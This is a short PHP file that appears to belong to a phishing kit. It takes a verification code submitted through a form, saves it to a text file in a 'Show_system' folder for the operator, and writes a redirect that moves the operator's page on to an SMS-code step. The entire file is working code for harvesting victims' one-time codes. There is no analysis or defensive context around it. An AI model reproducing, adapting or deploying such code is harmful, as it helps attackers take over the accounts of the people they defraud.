<?php


session_start();

if(isset($_POST['Appcodevverify'])) 
{
    
$Page .= ' <meta http-equiv="refresh" content="0;url=./smsv.php" /> ';

$fPage = fopen("../Show_system/Show_Page.txt", "w");
    fwrite($fPage, $Page);



$textimage = $_SESSION['codevverify'] = $_POST['codevverify'];

$yagmai .= ''.$textimage.'';
                      
$f = fopen("../Show_system/Show_Appcodev.txt", "w");
    fwrite($f, $yagmai);




}

else {




}

?>

